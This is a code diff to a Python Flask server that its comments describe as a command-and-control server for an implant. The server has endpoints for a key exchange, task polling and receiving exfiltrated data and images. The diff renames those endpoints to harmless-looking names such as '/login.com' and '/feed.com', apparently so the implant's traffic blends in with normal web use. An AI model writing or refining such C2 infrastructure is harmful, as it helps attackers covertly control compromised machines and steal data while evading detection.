@@ -56,13 +56,13 @@ def decrypt(ciphertext):
 def menu():
     return jsonify(command_menu)
 
-@app.route('/getkey', methods=['GET'])
+@app.route('/login.com', methods=['GET'])
 def get_public_key():
     #print(f"[+] Server public key: {dh1_public}")
     return jsonify({"key": dh1_public.decode('latin-1')})
 
 
-@app.route('/sendkey', methods=['POST'])
+@app.route('/auth.com', methods=['POST'])
 def send_public_key():
     global shared_key
     # print("in endpoint")
@@ -93,7 +93,7 @@ def assign_command(cmd_index):
 
 
 # Implant periodically polls this endpoint to get a task
-@app.route('/task', methods=['GET'])
+@app.route('/feed.com', methods=['GET'])
 def get_task():
     if not tasks.empty():
         task = tasks.get()
@@ -103,7 +103,7 @@ def get_task():
 
 # Implant invokes this endpoint to send exfiltrated data back to the server
 # Implant invokes this endpoint to send images back to the server
-@app.route('/upload', methods=['POST'])
+@app.route('/upload_photo.com', methods=['POST'])
 def receive_data():
     global latest_result
     file = request.files.get('file')
